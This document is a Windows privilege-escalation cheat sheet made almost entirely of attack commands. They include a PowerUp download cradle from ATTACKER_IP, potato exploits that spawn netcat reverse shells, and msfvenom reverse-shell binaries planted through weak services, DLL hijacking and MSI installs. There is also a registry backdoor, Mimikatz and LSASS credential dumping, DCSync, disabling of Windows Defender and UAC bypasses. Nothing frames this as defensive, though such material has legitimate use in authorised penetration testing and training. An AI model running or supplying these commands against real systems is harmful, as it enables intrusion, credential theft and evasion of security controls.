# Windows Privilege Escalation

## Windows-Enumeration


## System Information

```powershell
# OS version
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Hostname
hostname

# Architecture
echo %PROCESSOR_ARCHITECTURE%

# Hotfixes/Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Environment variables
set
```

## User Information

```powershell
# Current user
whoami
whoami /priv
whoami /groups
whoami /all

# All users
net user
net localgroup
net localgroup administrators

# User details
net user USERNAME

# Active sessions
query user
qwinsta
```

## Network Information

```powershell
# Network interfaces
ipconfig /all

# Routing table
route print

# ARP table
arp -a

# Active connections
netstat -ano
netstat -anob

# Firewall status
netsh firewall show state
netsh advfirewall show allprofiles

# Firewall rules
netsh advfirewall firewall show rule name=all
```

## Running Processes & Services

```powershell
# Processes
tasklist /v
tasklist /svc
wmic process get name,processid,executablepath

# Services
sc query
sc query state=all
net start
wmic service get name,displayname,pathname,startmode

# Scheduled tasks
schtasks /query /fo LIST /v
```

## Installed Software

```powershell
# Via wmic
wmic product get name,version

# Via registry
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# PowerShell
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
```

## Automated Tools

### WinPEAS
```powershell
.\winPEASx64.exe
.\winPEASany.exe

# Log output
.\winPEASx64.exe > winpeas_output.txt
```

### PowerUp
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
Invoke-AllChecks

# Specific checks
Get-UnquotedService
Get-ModifiableService
Get-ModifiableServiceFile
```

### Seatbelt
```powershell
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=system
.\Seatbelt.exe TokenPrivileges
```

## Token-Impersonation


## Check Privileges

```powershell
whoami /priv

# Look for:
# SeImpersonatePrivilege - Enabled
# SeAssignPrimaryTokenPrivilege - Enabled
# SeBackupPrivilege - Enabled
# SeRestorePrivilege - Enabled
# SeDebugPrivilege - Enabled
```

## PrintSpoofer (Windows 10/Server 2016-2019)

```powershell
# Execute command as SYSTEM
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -c "nc.exe ATTACKER_IP 443 -e cmd"
```

## JuicyPotato (Windows 7/8/Server 2008/2012)

```powershell
# Basic execution
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# With reverse shell
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe ATTACKER_IP 443 -e cmd.exe" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}

# CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

## GodPotato (Windows 2012-2022)

```powershell
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "nc.exe ATTACKER_IP 443 -e cmd"
```

## RoguePotato

```powershell
.\RoguePotato.exe -r ATTACKER_IP -l 9999 -e "cmd.exe"
```

## SeBackupPrivilege

```powershell
# Check if enabled
whoami /priv | findstr "SeBackupPrivilege\|SeRestorePrivilege"

# If enabled, can read/write any file
# Use to backup SAM and SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Or use robocopy with /B flag
robocopy /B C:\Windows\System32\config C:\temp SAM SYSTEM
```

## SeDebugPrivilege

```powershell
# Allows attaching to any process
# Can inject into SYSTEM process

# Use Mimikatz
mimikatz# privilege::debug
mimikatz# token::elevate
mimikatz# lsadump::sam
```

## Service-Exploits


## Unquoted Service Path

```powershell
# Find unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'}

# Check if we can write to directory
icacls "C:\Program Files\Vulnerable Service\"

# Create malicious executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o Common.exe

# Place in vulnerable path
copy Common.exe "C:\Program Files\Vulnerable Service\Common.exe"

# Restart service
sc stop VulnerableService
sc start VulnerableService
```

## Weak Service Permissions

```powershell
# Check service permissions
sc qc ServiceName
accesschk.exe /accepteula -uwcqv "user" *

# Check if we can modify service
accesschk.exe -uwcqv user ServiceName

# Modify service binary path
sc config ServiceName binpath= "C:\temp\nc.exe ATTACKER_IP 443 -e cmd.exe"

# Restart service
sc stop ServiceName
sc start ServiceName
```

## Insecure Service Executables

```powershell
# Find services running as SYSTEM
wmic service where started=true get name,startname

# Check permissions on service executable
icacls "C:\path\to\service.exe"
accesschk.exe /accepteula -quvw "C:\path\to\service.exe"

# If writable, replace with malicious binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o service.exe
move service.exe "C:\path\to\service.exe"

# Restart service
sc stop ServiceName
sc start ServiceName
```

## DLL Hijacking

```powershell
# Find missing DLLs
# Use Process Monitor (procmon) to identify DLLs loaded by services

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f dll -o hijack.dll

# Place in application directory
copy hijack.dll "C:\Program Files\Application\hijack.dll"

# Restart application/service
```

## Registry-Exploits


## AutoRun Registry Keys

```powershell
# Check AutoRun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Check permissions
accesschk.exe /accepteula -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# If writable, add malicious entry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe" /f
```

## AlwaysInstallElevated

```powershell
# Check if enabled (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are enabled:
# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o installer.msi

# Execute
msiexec /quiet /qn /i C:\temp\installer.msi
```

## Saved Credentials

```powershell
# List saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:administrator "cmd.exe /c nc.exe ATTACKER_IP 443 -e cmd.exe"
```

## Group Policy Preferences (GPP)

```powershell
# Look for Groups.xml on domain controller SYSVOL
\\DC\SYSVOL\domain.local\Policies\

# Search for cpassword
findstr /S /I cpassword \\DC\sysvol\domain.local\policies\*.xml

# Decrypt cpassword with gpp-decrypt (Kali)
gpp-decrypt <CPASSWORD>
```

## Scheduled-Tasks


## Enumerate Scheduled Tasks

```powershell
# List all tasks
schtasks /query /fo LIST /v

# Detailed info
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Run As User" /C:"Task To Run"

# Check specific task
schtasks /query /TN "TaskName" /fo LIST /v
```

## Weak Scheduled Task Permissions

```powershell
# Check permissions on task executable
icacls "C:\path\to\task.exe"
accesschk.exe /accepteula -quvw "C:\path\to\task.exe"

# If writable, replace with malicious binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o task.exe
move task.exe "C:\path\to\task.exe"

# Wait for scheduled task to run or force run
schtasks /run /tn "TaskName"
```

## Credential-Dumping


## Mimikatz

```powershell
# Dump credentials
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Dump SAM
mimikatz# lsadump::sam

# Dump LSA secrets
mimikatz# lsadump::secrets

# Dump cached credentials
mimikatz# lsadump::cache

# Kerberos tickets
mimikatz# sekurlsa::tickets

# Export Kerberos tickets
mimikatz# sekurlsa::tickets /export

# Pass-the-Hash
mimikatz# sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:powershell.exe
```

## LSASS Dump

```powershell
# Task Manager (GUI)
# Right-click lsass.exe -> Create dump file

# Procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Comsvcs.dll method
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# Extract with Mimikatz
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

## SAM & SYSTEM Files

```powershell
# SAM and SYSTEM are locked when Windows is running
# But backups might exist

# Check backup locations
C:\Windows\repair\SAM
C:\Windows\System32\config\RegBack\SAM

# Volume Shadow Copies
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Extract hashes with samdump2 (on Kali)
samdump2 SYSTEM SAM
```

## Impacket Secretsdump

```bash
# Remote SAM dump
impacket-secretsdump 'DOMAIN/user:password@TARGET'

# With NTLM hash
impacket-secretsdump -hashes :NTLM_HASH 'DOMAIN/user@TARGET'

# DCSync attack
impacket-secretsdump 'DOMAIN/user:password@DC_IP' -just-dc-user Administrator

# Dump NTDS.dit
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

## Credential Hunting

```powershell
# Unattended install files
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# IIS configuration
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# RDP saved credentials
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="PROFILE" key=clear

# Registry passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Search for passwords in files
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt *.config

# PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## AV-Evasion


## Check Windows Defender Status

```powershell
# Check status
sc query windefend
Get-MpComputerStatus

# Check exclusions
Get-MpPreference | Select-Object ExclusionPath
```

## Add Exclusions (Requires Admin)

```powershell
Add-MpPreference -ExclusionPath "C:\temp"
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Check Other AV Products

```powershell
wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname,productstate

# Services
sc query | findstr /i "anti virus av defender"
```

## UAC-Bypass


## Check UAC Level

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

## eventvwr.exe Bypass (Windows 7-10)

```powershell
# Hijack registry key
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe
```

## fodhelper.exe Bypass (Windows 10)

```powershell
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /f
fodhelper.exe
```

